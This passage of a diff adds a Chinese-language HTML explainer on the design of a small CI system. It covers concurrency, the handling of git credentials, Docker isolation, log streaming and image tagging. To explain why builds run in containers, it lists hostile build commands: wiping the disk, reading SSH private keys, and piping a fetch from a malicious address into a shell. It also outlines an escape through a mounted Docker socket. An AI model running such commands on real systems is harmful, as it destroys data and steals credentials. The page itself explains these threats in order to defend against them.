+            <span class="k">defer func</span>() { &lt;-p.sem }()   <span class="c">// 干完了，腾出车位</span>
+            p.execute(ctx, j)
+        }(job)
+    }
+}</pre></div></div><div class="blk"><h3 class="k-tip">两个 Go 惯用技巧</h3><div class="tip"><div class="t">为什么这样设计</div>
+<strong>① <code>struct{}{}</code> 是空结构体，占 0 字节内存</strong> —— 纯粹用来计数，是 Go 里实现信号量的标准做法。<br><br>
+<strong>② <code>go func(j *BuildJob){...}(job)</code> 末尾那个 <code>(job)</code> 不能省</strong> ——
+必须把循环变量作为参数传进去。否则所有 goroutine 会共享同一个变量，最后全部执行最后一个任务。
+这是 Go 并发最经典的 bug（Go 1.22 已修复循环变量语义，但显式传参仍是好习惯）。</div></div><div class="blk">
+<p><strong>背压（Backpressure）</strong>是个很重要的概念：<em>当下游处理不过来时，把压力反向传导回上游，让上游慢下来。</em>
+在这个系统里，压力是这样一层层传导的：</p></div><div class="blk"><h3>背压链条：系统如何自我保护</h3><div class="flow">车位满了（4 个都在跑）
+   │
+   ▼  新任务进不了 pool
+堆在队列里
+   │
+   ▼  队列也满了（queue_capacity = 200）
+Enqueue 返回错误
+   │
+   ▼
+webhook 处理函数返回 503 Service Unavailable
+   │
+   ▼
+GitHub 收到 503，知道「对方忙」──▶ 稍后自动重试
+   │
+   └──▶ 【妙处】你什么都不用做，GitHub 自己帮你排队</div></div><div class="blk"><h3 class="k-warn">踩过的坑</h3><div class="warn"><div class="t">坑 / 必须守住</div>
+<strong>反面教材：</strong>队列满了还硬塞进内存（比如用无界 slice），最后 OOM 崩溃 —— 所有任务全丢。<br><br>
+原则：<strong>宁可拒绝，不可崩溃。</strong> 503 的语义就是「我现在忙，你等会儿再来」，各大平台都会正确处理它。</div></div><div class="blk">
+<p><strong>context：超时与取消的传递。</strong>Go 里所有可能「卡住」的操作都要传一个 <code>context</code>。
+它像一根<em>贯穿整个调用链的绳子</em>，你一拉，链上所有环节同时知道「该停了」。</p></div><div class="blk"><h3 class="k-code">技术细节</h3><div class="codewrap"><span class="lang">go</span><pre>ctx, cancel := context.WithTimeout(parentCtx, <span class="n">30</span>*time.Minute)
+<span class="k">defer</span> cancel()
+
+<span class="c">// 这个 ctx 一路传给：Docker 创建容器、SSH 连接、HTTP 调 LLM……</span>
+<span class="c">// 30 分钟一到，或用户点了「中止运行」，所有环节同时收到取消信号</span></pre></div></div><div class="blk">
+<p><strong>为什么必须有超时：</strong>网络会挂、Docker daemon 会卡死、SSH 会遇到永不响应的主机。
+<em>没有超时的阻塞调用 = 永久泄漏一个 goroutine = 内存只增不减。</em></p></div><div class="blk"><h3>六条并发铁律（每条都是真会踩的坑）</h3><div class="tw"><table><thead><tr><th>#</th><th>铁律</th><th>违反的后果</th></tr></thead><tbody><tr><td class="mono">1</td><td>每个 goroutine 都要有明确退出路径（channel 关闭或 ctx 取消）</td><td>goroutine 泄漏，内存持续上涨</td></tr><tr><td class="mono">2</td><td>谁创建 channel 谁关闭，且只在<strong>发送方</strong>关闭</td><td>panic: close of closed channel</td></tr><tr><td class="mono">3</td><td>不要持锁做 IO</td><td>一个慢请求阻塞所有其他请求</td></tr><tr><td class="mono">4</td><td>所有阻塞 IO 带 ctx 和超时（Docker / SSH / HTTP 都会挂住）</td><td>永久挂起</td></tr><tr><td class="mono">5</td><td><strong>清理逻辑用独立 context</strong></td><td>容器泄漏，磁盘被塞满（见下）</td></tr><tr><td class="mono">6</td><td>全程 <span class='mono'>go test -race</span></td><td>并发 bug 靠肉眼永远找不出来</td></tr></tbody></table></div></div><div class="blk"><h3 class="k-code">铁律 5 展开：最隐蔽也最反直觉的一条</h3><div class="codewrap"><span class="lang">go</span><pre><span class="bad">// ❌ 错误写法</span>
+<span class="k">defer</span> docker.ContainerRemove(ctx, id, ...)
+
+<span class="c">// 为什么错：如果 ctx 是因为「超时」或「用户取消」而失效的，</span>
+<span class="c">// 那这个 defer 里的删除操作也会立刻失败 ──▶ 容器永久泄漏在宿主机上</span>
+<span class="c">// 跑上几百次构建，磁盘被废弃容器塞满，而且很难查出来</span>
+
+<span class="good">// ✅ 正确写法</span>
+<span class="k">defer</span> docker.ContainerRemove(context.WithoutCancel(ctx), id, ...)
+<span class="c">// 语义：「不管前面为什么取消，清理动作必须做完」</span></pre></div></div></div></section>
+<section class="station plan" id="s4"><div class="shead"><span class="snum">④</span><div class="stitle"><h2>检出代码：git 凭据的安全处理</h2><p class="sub">私有仓库怎么拉代码，且保证 token 绝不泄漏进日志</p></div><span class="sbadge"><span class="b plan">后端待实现</span></span><span class="chev">▼</span></div><div class="sbody"><div class="blk">
+<p><strong>发生了什么：</strong>系统要把你的代码从 GitHub 拉到本地。公开仓库直接 clone 就行，
+<em>私有仓库需要凭据</em>（不然 GitHub 不给你代码）。</p></div><div class="blk"><h3 class="k-analogy">小白类比</h3><div class="analogy"><div class="t">打个比方</div>
+<strong>把代码「取快递」和「拆快递」分给两个人做。</strong><br><br>
+取件员（Go 进程）持有你的取件码，去柜台把包裹取出来。<br>
+拆件员（构建容器）只拿到已经取出的包裹，<strong>他根本不知道取件码是什么</strong>。<br><br>
+这样即使拆件员是坏人（恶意构建脚本），他也偷不到你的取件码。</div></div><div class="blk"><h3 class="k-warn">核心安全决策：凭据绝不进容器</h3><div class="warn"><div class="t">坑 / 必须守住</div>
+这一点是整个 git 集成里最重要的设计。</div></div><div class="blk"><h3>流程</h3><div class="flow">❌ 危险做法：把 token 塞进构建容器的环境变量
+
+   用户的构建脚本里只要写一句 `env` 或 `printenv`
+        │
+        ▼
+   token 出现在构建日志里
+        │
+        ▼
+   日志能在网页上看，还可能被发给 LLM 分析
+        │
+        ▼
+   token 泄漏 ──▶ 别人能读你所有私有仓库
+
+
+✅ 实际做法：Go 进程自己 clone，容器只拿到代码
+
+   Go 侧：git clone（用凭据）──▶ 得到 workspace 目录
+   容器：  把这个目录【只读挂载】进去 ──▶ 容器里根本没有凭据这个东西</div></div><div class="blk"><h3 class="k-tip">「只读挂载」的额外好处</h3><div class="tip"><div class="t">为什么这样设计</div>
+<code>:ro</code>（read-only）意味着构建脚本能读代码，但<strong>改不了</strong>。
+防止构建过程偷偷篡改仓库内容，产物写到单独的 <code>/output</code> 目录。</div></div><div class="blk"><h3>凭据传给 git 的三种方式，安全性天差地别</h3><div class="tw"><table><thead><tr><th>做法</th><th>问题</th></tr></thead><tbody><tr><td>写进 URL：<span class='mono'>https://TOKEN@github.com/...</span></td><td><span class='no'>❌ token 被永久写入 <span class='mono'>.git/config</span> 文件；出现在进程列表 <span class='mono'>ps aux</span> 里；还会被打进日志</span></td></tr><tr><td>命令行参数 <span class='mono'>--config http.extraHeader=...</span></td><td><span class='no'>❌ 同样出现在 <span class='mono'>ps aux</span> 里，同机器其他用户能看到</span></td></tr><tr><td><strong>环境变量 <span class='mono'>GIT_CONFIG_COUNT</span></strong></td><td><span class='yes'>✅ 只存在于这个子进程的环境块里，<strong>不落盘、不出现在命令行、进程结束即消失</strong></span></td></tr></tbody></table></div></div><div class="blk"><h3 class="k-code">git 2.31+ 提供的机制：环境变量式临时配置</h3><div class="codewrap"><span class="lang">bash</span><pre><span class="k">export</span> GIT_CONFIG_COUNT=<span class="n">2</span>
+<span class="k">export</span> GIT_CONFIG_KEY_0=http.h...ader
+<span class="k">export</span> GIT_CONFIG_VALUE_0=<span class="s">"AUTHORIZATI…oken ghp_xxx"</span>
+<span class="k">export</span> GIT_CONFIG_KEY_1=credential.helper
+<span class="k">export</span> GIT_CONFIG_VALUE_1=              <span class="c"># 清空，避免 git 去找系统凭据管理器</span>
+
+git clone https://github.com/acme/web-api.git
+
+<span class="c"># 另外两个必须设置的：</span>
+<span class="k">export</span> GIT_TERMINAL_PROMPT=<span class="n">0</span>   <span class="c"># 凭据错误时 git 默认会弹交互式提示等输密码</span>
+                              <span class="c"># 在无人值守的 CI 里这会【永久卡住】── 必须关掉</span>
+git fetch -q                    <span class="c"># 静默模式，减少 token 意外出现在输出里的机会</span></pre></div></div><div class="blk"><h3 class="k-tip">这个机制是实测验证过的，不是「据说」</h3><div class="tip"><div class="t">为什么这样设计</div>
+在本机 git 2.45.1 上实测确认三件事：<br>
+① 注入的值能被 <code>git config --get</code> 读到；<br>
+② <strong>不会写进 <code>.git/config</code></strong>（检查过文件内容）；<br>
+③ unset 环境变量后回落到全局值。<br><br>
+所以文档里写的是「已实测」。<em>架构文档里的技术断言都要求可溯源，这是本项目的一条硬规则。</em></div></div><div class="blk">
+<p><strong>为什么按 commit SHA 检出，而不是按分支名</strong> —— 这是可复现性的关键：</p></div><div class="blk"><h3>按分支名检出的陷阱</h3><div class="flow">webhook 说：分支 main 上有新提交 a3f9c21
+
+❌ 如果执行 git clone -b main
+     ──▶ 拿到的是「此刻 main 的最新提交」
+     ──▶ 但在 webhook 到达和构建开始之间，可能又有人 push 了新提交
+     ──▶ 你构建的其实不是 a3f9c21，而是别的 commit
+     ──▶ 界面上显示 a3f9c21，实际构建的是另一个 ──▶ 这是【欺诈】
+
+✅ 正确做法：精确检出 a3f9c21
+     git fetch --depth=1 origin a3f9c21
+     git checkout FETCH_HEAD
+     ──▶ 「你看到的 SHA 就是你构建的 SHA」</div></div><div class="blk">
+<p><code>--depth=1</code> 是<strong>浅克隆</strong>：只拉最新一层，不拉整个历史。
+一个大仓库的完整历史可能有几个 GB，浅克隆只要几十 MB —— 对小团队省时省盘。</p>
+<p>GitHub 支持按任意历史 SHA 浅 fetch（已用 <code>octocat/Hello-World</code> 的非分支尖端提交实测）。
+GitLab 侧没测到，所以设计里带了<strong>回退链</strong>：</p></div><div class="blk"><h3>带回退的可移植检出策略</h3><div class="flow">git fetch --depth=1 origin &lt;sha&gt;
+        │
+   成功 ├──────────────────────────▶ git checkout FETCH_HEAD ──▶ 继续构建
+        │
+   失败 ▼（服务器不支持按 SHA fetch）
+git fetch --depth=1 origin &lt;ref&gt; + git checkout &lt;sha&gt;
+        │
+   成功 ├──────────────────────────▶ 继续构建
+        │
+   失败 ▼
+标记 failed，错误分类 = git_auth
+        │
+        └──▶ 【绝不静默用分支最新代码】宁可失败，也不能悄悄构建错误的版本</div></div><div class="blk"><h3>检出失败必须分类 —— 因为处理策略完全不同</h3><div class="tw"><table><thead><tr><th>错误特征</th><th>分类</th><th>可否自动重试</th><th>LOA 档位</th></tr></thead><tbody><tr><td>401 / 403</td><td class="mono">git_auth</td><td><span class='no'>不可</span>（重试也没用，要人改配置）</td><td class="mono">4 人批准</td></tr><tr><td>超时 / 连接被拒 / DNS 解析失败</td><td class="mono">transient_network</td><td><span class='yes'>可</span></td><td class="mono">7 自动重试</td></tr></tbody></table></div></div><div class="blk">
+<p>这个分类会喂给后面的 <strong>LOA 策略引擎</strong>（见第 ⑫ 站）—— 网络抖动可以自动重试，
+凭据错误必须人来处理。<em>「机器做机械的事，人做判断的事」在这里第一次体现。</em></p></div></div></section>
+<section class="station plan" id="s5"><div class="shead"><span class="snum">⑤</span><div class="stitle"><h2>类型检测：为什么能做到「零配置」</h2><p class="sub">扫一眼仓库根目录，就知道该怎么构建它</p></div><span class="sbadge"><span class="b plan">后端待实现</span></span><span class="chev">▼</span></div><div class="sbody"><div class="blk">
+<p><strong>发生了什么：</strong>系统扫描仓库根目录，靠<strong>标记文件</strong>推断这是什么项目，
+然后生成对应的构建命令序列。</p></div><div class="blk"><h3 class="k-analogy">小白类比</h3><div class="analogy"><div class="t">打个比方</div>
+<strong>看厨房里的家伙什，就知道这家人做什么菜。</strong><br><br>
+看见炒锅和菜刀 → 中餐；看见烤箱和量杯 → 烘焙；看见寿司帘 → 日料。<br>
+你不用问，看一眼工具就知道了。<br><br>
+项目也一样：<code>package.json</code> 就是 Node 项目的「炒锅」，
+<code>go.mod</code> 就是 Go 项目的「寿司帘」。</div></div><div class="blk"><h3>检测规则表（internal/build/detect.go）</h3><div class="tw"><table><thead><tr><th>探测文件</th><th>推断类型</th><th>Base Image</th><th>默认命令</th></tr></thead><tbody><tr><td class="mono">Dockerfile</td><td>docker（用户自己控制）</td><td>—</td><td class="mono">docker build -t $IMAGE .</td></tr><tr><td class="mono">package.json</td><td>Node.js</td><td class="mono">node:20-alpine</td><td class="mono">npm ci → npm run build</td></tr><tr><td class="mono">pnpm-lock.yaml</td><td>Node (pnpm)</td><td class="mono">node:20-alpine</td><td class="mono">pnpm i --frozen-lockfile && pnpm build</td></tr><tr><td class="mono">go.mod</td><td>Go</td><td class="mono">golang:1.22-alpine</td><td class="mono">go build ./...</td></tr><tr><td class="mono">requirements.txt</td><td>Python</td><td class="mono">python:3.12-slim</td><td class="mono">pip install -r requirements.txt</td></tr><tr><td class="mono">pyproject.toml</td><td>Python (poetry)</td><td class="mono">python:3.12-slim</td><td class="mono">poetry install</td></tr><tr><td class="mono">pom.xml</td><td>Java (Maven)</td><td class="mono">maven:3.9-temurin-21</td><td class="mono">mvn -B package</td></tr><tr><td class="mono">build.gradle</td><td>Java (Gradle)</td><td class="mono">gradle:8-jdk21</td><td class="mono">gradle build</td></tr><tr><td class="mono">Cargo.toml</td><td>Rust</td><td class="mono">rust:1.78-alpine</td><td class="mono">cargo build --release</td></tr><tr><td class="mono">composer.json</td><td>PHP</td><td class="mono">composer:2</td><td class="mono">composer install --no-dev</td></tr><tr><td>全都不匹配</td><td>unknown</td><td class="mono">alpine:3.20</td><td>报错，要求用户手写 pipeline</td></tr></tbody></table></div></div><div class="blk"><h3 class="k-tip">原理：约定优于配置（Convention over Configuration）</h3><div class="tip"><div class="t">为什么这样设计</div>
+与其让用户写一堆配置，不如<strong>猜</strong> —— 猜对了就省事，猜错了允许改。<br><br>
+这是这个项目「轻量」卖点的核心：<br>
+&nbsp;&nbsp;• Jenkins 要你装插件、写 Jenkinsfile、配一堆东西<br>
+&nbsp;&nbsp;• GoPulse 是<strong>连上仓库就能跑</strong><br><br>
+<em>注意规则有优先级：</em><code>Dockerfile</code> 优先级最高 —— 有它就说明用户明确想自己控制构建。
+一个 Node 项目也可能有 Dockerfile，这时应该听 Dockerfile 的。</div></div><div class="blk">
+<p><strong>Pipeline 快照</strong>是我认为设计上最漂亮的一处。检测出的命令序列，
+会<em>存成快照写进这次构建的记录里</em>：</p></div><div class="blk"><h3 class="k-code">技术细节</h3><div class="codewrap"><span class="lang">sql</span><pre><span class="k">CREATE TABLE</span> builds (
+    ...
+    pipeline_json  <span class="k">TEXT</span>,   <span class="c">-- 本次实际执行的步骤（快照）</span>
+    base_image     <span class="k">TEXT</span>,   <span class="c">-- 本次用的镜像</span>
+);</pre></div></div><div class="blk"><h3 class="k-warn">为什么必须存快照，而不是每次现算</h3><div class="warn"><div class="t">坑 / 必须守住</div></div></div><div class="blk"><h3>流程</h3><div class="flow">三月：构建 #100，当时检测规则说 Node 项目跑 `npm ci`
+五月：你改了检测规则，改成 `npm ci && npm run lint`
+六月：回头看 #100 的构建记录
+
+❌ 如果现算：界面显示 #100 跑了 `npm ci && npm run lint`
+   ──▶ 但它当时其实没跑 lint！【你在骗自己】
+
+✅ 存快照：  界面显示 #100 跑了 `npm ci`
+   ──▶ 这就是当时真实发生的事</div></div><div class="blk">
+<p><strong>「历史记录必须反映历史事实」</strong> —— 这个原则在任何有审计需求的系统里都成立。
+它也是论文里能讲的一个设计亮点：<em>检测规则可以演进，历史构建永远可复现。</em></p></div></div></section>
+<section class="station plan" id="s6"><div class="shead"><span class="snum">⑥</span><div class="stitle"><h2>Docker 构建：隔离的原理</h2><p class="sub">为什么构建脚本等于「任意代码执行」，以及怎么把它关进笼子</p></div><span class="sbadge"><span class="b plan">后端待实现</span></span><span class="chev">▼</span></div><div class="sbody"><div class="blk"><h3 class="k-analogy">小白类比</h3><div class="analogy"><div class="t">打个比方</div>
+<strong>容器 = 一个打包好的、和你机器隔离的迷你 Linux。</strong><br><br>
+想象一个魔法盒子：里面装着一个完整的 Linux，预装了 Node.js 20。
+你把代码丢进去，在盒子里执行命令，<strong>盒子外你的电脑完全不受影响</strong>。
+盒子用完就扔掉，下次再拿一个全新的。<br><br>
+和虚拟机的区别：虚拟机模拟整个硬件（重，启动几十秒）；
+容器<strong>共享宿主机内核</strong>（轻，启动几百毫秒）。</div></div><div class="blk"><h3>为什么必须用容器 —— 三个真实痛点</h3><div class="tw"><table><thead><tr><th>理由</th><th>没有容器会怎样</th><th>有容器之后</th></tr></thead><tbody><tr><td><strong>环境一致</strong></td><td>你笔记本装了 Node 20 和某个全局 sass 编译器，构建服务器只有 Node 18 → 同样代码本地成功、服务器失败 → 花两小时排查发现是环境差异</td><td>每次都从 <span class='mono'>node:20-alpine</span> 这个<strong>完全相同的镜像</strong>开始 → 本地跑同一镜像，行为一致</td></tr><tr><td><strong>安全</strong></td><td>构建脚本可以在服务器上执行任意命令（详见下方）</td><td>恶意操作被关在容器里，宿主机不受影响</td></tr><tr><td><strong>可复现</strong></td><td>上次构建留下的 <span class='mono'>node_modules</span>、临时文件、缓存都会影响这次</td><td>每次全新 → <strong>同样的代码 + 同样的镜像 = 同样的结果</strong></td></tr></tbody></table></div></div><div class="blk"><h3 class="k-warn">很多人没意识到：构建脚本 = 任意代码执行</h3><div class="warn"><div class="t">坑 / 必须守住</div>
+你让系统执行用户的 <code>npm run build</code>，<strong>就等于让用户在你的服务器上执行任意命令</strong>。
+恶意（或不小心）的构建脚本可以：</div></div><div class="blk"><h3>流程</h3><div class="flow">rm -rf /                    ──▶ 删掉你的服务器
+cat ~/.ssh/id_rsa           ──▶ 偷走你的 SSH 密钥
+curl 恶意地址 | sh           ──▶ 装后门
+跑挖矿程序                   ──▶ 吃满 CPU
+
+容器把这些关在笼子里：
+  · 容器内的 rm -rf / 只删容器自己的文件
+  · 容器内看不到宿主机的 ~/.ssh（除非你主动挂载进去）</div></div><div class="blk"><h3 class="k-warn">还有一条更狠的防御：容器不挂 Docker socket</h3><div class="warn"><div class="t">坑 / 必须守住</div></div></div><div class="blk"><h3>流程</h3><div class="flow">❌ 危险：把 /var/run/docker.sock 挂进构建容器
+
+   容器里的代码可以通过这个 socket 控制【宿主机的 Docker】
+        │
+        ▼
+   它可以起一个【特权容器】，挂载宿主机根目录
+        │
+        ▼
+   完全逃逸 ──▶ 等于拿到了宿主机 root
+
+✅ 本设计：所有 Docker 操作由【外层的 Go 进程】做
+          容器里只有代码和工具链，碰不到 Docker</div></div><div class="blk"><h3 class="k-code">挂载配置：注意 :ro 后缀</h3><div class="codewrap"><span class="lang">go</span><pre>HostConfig: &amp;container.HostConfig{
+    Binds: []<span class="k">string</span>{
+        workspace + <span class="s">":/workspace:ro"</span>,   <span class="c">// 代码目录，ro = read-only 只读</span>
+        outputDir + <span class="s">":/output"</span>,         <span class="c">// 产物目录，可写</span>
+    },
+    NetworkMode: <span class="s">"bridge"</span>,
+},
+
+<span class="c">// 创建容器</span>
+resp, err := docker.ContainerCreate(ctx, &amp;container.Config{
+    Image: steps.BaseImage,
+    Cmd:   []<span class="k">string</span>{<span class="s">"sh"</span>, <span class="s">"-c"</span>, steps.Script},
+    Env:   job.Secrets.AsEnv(),       <span class="c">// 只注入【必要】的 secret，不是全部</span>
+}, hostConfig, <span class="k">nil</span>, <span class="k">nil</span>, <span class="s">"build-"</span>+jobID)
+
+<span class="c">// 清理必须用独立 context（并发铁律 5）</span>
+<span class="k">defer</span> docker.ContainerRemove(context.WithoutCancel(ctx), resp.ID, ...)</pre></div></div><div class="blk">
+<p><strong>判定成败：退出码是唯一真相。</strong>这是整个 CI 系统最朴素也最核心的机制。</p></div><div class="blk"><h3>exit code 的含义</h3><div class="tw"><table><thead><tr><th class="mono">退出码</th><th>含义</th><th>系统动作</th></tr></thead><tbody><tr><td class="mono">0</td><td>成功</td><td>阶段 passed，继续下一阶段</td></tr><tr><td class="mono">非 0</td><td>失败（不同数字有不同含义，但 CI 只关心「是不是 0」）</td><td>阶段 failed，<strong>后续阶段全部 skipped</strong></td></tr><tr><td class="mono">137</td><td>被 SIGKILL 杀掉（通常是 OOM 或超时）</td><td>标记 timeout / oom</td></tr><tr><td class="mono">143</td><td>被 SIGTERM 终止（通常是主动取消）</td><td>标记 cancelled</td></tr></tbody></table></div></div><div class="blk"><h3 class="k-tip">这个「委托」关系是 CI 能通用于任何语言的原因</h3><div class="tip"><div class="t">为什么这样设计</div>
+GoPulse <strong>不理解</strong>你的代码，不理解 pytest 的断言，不理解 TypeScript 的类型系统 ——
+它<strong>只看退出码</strong>。<br><br>
+测试框架自己负责把结果翻译成退出码，CI 只负责「在一致的环境里执行」和「读码判定」。<br><br>
+所以同一套系统能支持 Node、Go、Python、Java、Rust…… <em>它不需要懂任何一种语言。</em></div></div><div class="blk"><h3 class="k-warn">当前设计的一个真实缺口（诚实说明）</h3><div class="warn"><div class="t">坑 / 必须守住</div>
+现在的 6 个阶段是 <code>检出代码 → 安装依赖 → 执行构建 → 生成产物 → 部署 → 健康检查</code>，
+<strong>没有独立的「执行测试」阶段</strong>。<br><br>
+测试是通过「执行构建」间接发生的 —— 因为那一步跑的是项目自己 <code>package.json</code> 里的 build 脚本，
+如果用户在脚本里链了测试（<code>"build": "vitest run &amp;&amp; tsc -b"</code>），测试就会跑，退出码照样决定成败。<br><br>
+<em>机制上完全支持测试，只是没有把它单独拎出来成一个阶段。</em>
+单独拎出来的价值在于<strong>失败归因</strong>（测试失败 vs 编译失败是两类问题，需要不同的 analyzer 和不同的自动化档位）
+和<strong>独立计时</strong>。</div></div></div></section>
+<section class="station plan" id="s7"><div class="shead"><span class="snum">⑦</span><div class="stitle"><h2>日志管道：实时推送的原理</h2><p class="sub">容器里输出一行，浏览器上立刻看到 —— 中间发生了什么</p></div><span class="sbadge"><span class="b part">前端已实现</span><span class="b plan">后端待实现</span></span><span class="chev">▼</span></div><div class="sbody"><div class="blk">
+<p><strong>技术选型：为什么用 SSE 不用 WebSocket。</strong></p></div><div class="blk"><h3>对比</h3><div class="tw"><table><thead><tr><th></th><th class="mono">SSE (Server-Sent Events)</th><th class="mono">WebSocket</th></tr></thead><tbody><tr><td>方向</td><td>单向：服务器 → 浏览器</td><td>双向</td></tr><tr><td>协议</td><td><span class='yes'>就是普通 HTTP</span></td><td>需要协议升级握手</td></tr><tr><td>断线重连</td><td><span class='yes'><strong>浏览器自动重连</strong>，还带 Last-Event-ID</span></td><td>要自己写重连逻辑</td></tr><tr><td>代理/防火墙兼容</td><td><span class='yes'>好（就是 HTTP）</span></td><td>有时被拦</td></tr><tr><td>实现复杂度</td><td><span class='yes'>极低，连库都不需要</span></td><td>中等</td></tr><tr><td>适用场景</td><td><strong>构建日志（纯单向）← 本系统选它</strong></td><td>聊天、协同编辑（需要双向）</td></tr></tbody></table></div></div><div class="blk"><h3 class="k-code">SSE 的实现朴素到令人意外</h3><div class="codewrap"><span class="lang">text</span><pre>HTTP 响应头：  Content-Type: text/event-stream
+              Cache-Control: no-cache
+              Connection: keep-alive
+
+然后【保持连接不关】，持续往里写：
+
+  data: {"seq":1,"ts":"10:24:28","text":"$ npm run build"}
+
+
+  data: {"seq":2,"ts":"10:24:29","text":"&gt; web-api@1.0.0 build"}
+
+
+  data: {"seq":3,...}
+
+
+
+前端用浏览器原生的 EventSource 接收，几行代码。</pre></div></div><div class="blk">
+<p><strong>核心难点：fan-out（扇出）与慢消费者。</strong>一份日志要同时发给多个地方：</p></div><div class="blk"><h3>日志管道拓扑</h3><div class="flow">                        ┌──▶ 环形缓冲区（存最近 N 行，供新连接补历史）
+                        │
+容器 stdout/stderr ──▶ LogPipe ──▶ 批量落库（每 200 行或每 2 秒 flush 一次）
+                        │
+                        └──▶ 扇出给每个订阅者 ──▶ 各自的 channel ──▶ SSE 响应
+                                                                  （可能同时有 3 个人在看）</div></div><div class="blk"><h3 class="k-warn">必须处理好的问题：如果某个订阅者很慢怎么办？</h3><div class="warn"><div class="t">坑 / 必须守住</div>
+比如有人用手机 3G 网络看日志，或者开了页面就去吃饭了，浏览器不读数据。</div></div><div class="blk"><h3 class="k-code">技术细节</h3><div class="codewrap"><span class="lang">go</span><pre><span class="bad">// ❌ 错误写法</span>
+<span class="k">for</span> _, ch := <span class="k">range</span> p.subs {
+    ch &lt;- line        <span class="c">// 如果这个订阅者的 channel 满了，这里会【阻塞】</span>
+}
+<span class="c">// 后果链条：</span>
+<span class="c">//   一个卡住的浏览器 → 阻塞整个日志写入 → 阻塞构建容器读取输出</span>
+<span class="c">//   → 容器输出缓冲区满 → 构建进程被卡住 → 构建失败</span>
+<span class="c">// 【一个看日志的人，搞崩了一次构建】</span>
+
+<span class="good">// ✅ 正确写法</span>
+<span class="k">for</span> _, ch := <span class="k">range</span> p.subs {
+    <span class="k">select</span> {
+    <span class="k">case</span> ch &lt;- line:
+    <span class="k">default</span>:                    <span class="c">// channel 满了？立刻放弃，绝不等待</span>
+        p.dropped.Add(<span class="n">1</span>)        <span class="c">// 记一下丢了多少行</span>
+    }
+}</pre></div></div><div class="blk"><h3 class="k-tip">为什么这样</h3><div class="tip"><div class="t">为什么这样设计</div>
+<strong>原则：宁可给慢的订阅者丢几行日志，也绝不能让它拖垮构建。</strong><br><br>
+丢的行会在它重连时通过环形缓冲区补上（浏览器自动重连并带上 <code>Last-Event-ID</code>）。</div></div><div class="blk">
+<p><strong>环形缓冲区（ring buffer）</strong>是一个固定大小的循环数组，写满就从最开头覆盖：</p></div><div class="blk"><h3>流程</h3><div class="flow">容量 500 行。写到第 501 行时，覆盖掉第 1 行。
+
+  [451][452]...[500][1][2]...[450]
+   ↑ 最旧                 ↑ 最新
+   └────── 写指针绕圈 ──────┘</div></div><div class="blk"><h3>环形缓冲的两个作用</h3><div class="kv"><div class="k">内存有上限</div><div>一个构建可能输出 50 万行日志，全存内存会爆。环形缓冲只保留最近的，旧的已经落库了</div><div class="k">新订阅者补历史</div><div>你打开页面时构建已经跑了一半 → 缓冲区里最近的 500 行立刻推给你，然后接上实时流</div><div class="k">前端也用了一遍</div><div><span class='mono'>useLogStream</span> 里同样限制行数，超出丢最旧的 —— 长时间开着页面看日志，不能把浏览器内存吃光</div></div></div><div class="blk"><h3 class="k-code">落库策略：批量而非逐行</h3><div class="codewrap"><span class="lang">text</span><pre><span class="bad">❌ 每行一次 INSERT：</span>
+   50 万行 = 50 万次磁盘写入 = 数据库被打死
+
+<span class="good">✅ 攒够 200 行 或 到 2 秒，一次 INSERT 一个 chunk（还可 zstd 压缩）</span>
+
+这就是为什么日志表设计成 log_chunks（分块存 BLOB）而不是一行一条记录：
+
+   CREATE TABLE log_chunks (
+       build_id  INTEGER NOT NULL REFERENCES builds(id) ON DELETE CASCADE,
+       seq       INTEGER NOT NULL,     -- 分块序号，便于分段拉取
+       content   BLOB    NOT NULL,     -- 可压缩
+       UNIQUE(build_id, seq)
+   );</pre></div></div></div></section>
+<section class="station plan" id="s8"><div class="shead"><span class="snum">⑧</span><div class="stitle"><h2>产物与镜像 tag：为什么不用 latest</h2><p class="sub">不可变基础设施 —— 回滚能力的根基</p></div><span class="sbadge"><span class="b plan">后端待实现</span></span><span class="chev">▼</span></div><div class="sbody"><div class="blk">
+<p>构建成功后产出一个 Docker 镜像，打上标签：<code>web-api:a3f9c21</code>（用 commit SHA）。</p></div><div class="blk"><h3 class="k-analogy">小白类比</h3><div class="analogy"><div class="t">打个比方</div>
+<strong>latest 就像把文件都命名成「新建文档.docx」。</strong><br><br>
+每次保存都覆盖同一个名字，你永远不知道现在这个「新建文档」是哪一版，
+更不可能回到上周三那个版本。<br><br>
+用 SHA 命名就像<strong>论文的版本号</strong>：<code>论文_v1.docx</code>、<code>论文_v2.docx</code> ——
+每一版都独立存在，随时能翻回任何一版。</div></div><div class="blk"><h3>对比</h3><div class="tw"><table><thead><tr><th></th><th class="mono">用 latest</th><th class="mono">用 commit SHA</th></tr></thead><tbody><tr><td>版本可辨识性</td><td><span class='no'>不知道 latest 现在到底是哪个版本</span></td><td><span class='yes'>tag 与代码版本一一对应，永久不变</span></td></tr><tr><td>回滚</td><td><span class='no'>回滚到哪个 latest？<strong>没法回滚</strong></span></td><td><span class='yes'>重新部署 <span class='mono'>web-api:7b1e044</span> 即可</span></td></tr><tr><td>审计</td><td><span class='no'>说不清线上跑的是什么</span></td><td><span class='yes'>看到 tag 就知道是哪次提交</span></td></tr><tr><td>并发部署</td><td><span class='no'>两个构建都推 latest，互相覆盖</span></td><td><span class='yes'>各自独立 tag，互不干扰</td></tr></tbody></table></div></div><div class="blk"><h3 class="k-tip">这叫「不可变基础设施」（Immutable Infrastructure）</h3><div class="tip"><div class="t">为什么这样设计</div>
+<strong>版本一旦产出就不再修改，要改就产新版本。</strong><br><br>
+好处是回滚变得极其简单 —— 不需要「撤销」什么，只需要把指针指回上一个版本。
+这也是第 ⑩ 站「自动回滚能在几秒内完成」的前提：<em>回滚不需要重新构建</em>。</div></div></div></section>
+<section class="station plan" id="s9"><div class="shead"><span class="snum">⑨</span><div class="stitle"><h2>部署：SSH 与中间人攻击</h2><p class="sub">加密远程执行的原理，以及最容易被忽略的一道防御</p></div><span class="sbadge"><span class="b plan">后端待实现</span></span><span class="chev">▼</span></div><div class="sbody"><div class="blk"><h3 class="k-analogy">小白类比</h3><div class="analogy"><div class="t">打个比方</div>
+<strong>SSH = 加密的远程命令行。</strong><br><br>
+你在自己电脑上敲命令，实际在几百公里外的服务器上执行，输出再传回来，全程加密 ——
+像给服务器接了一根很长很长的键盘线和屏幕线，但中间没人能偷看。<br><br>
+<code style="background:#1a2743">ssh deploy@10.0.0.8 "docker-compose up -d"</code><br>
+意思：以 <code>deploy</code> 用户身份登录 <code>10.0.0.8</code>，执行引号里的命令。</div></div><div class="blk">
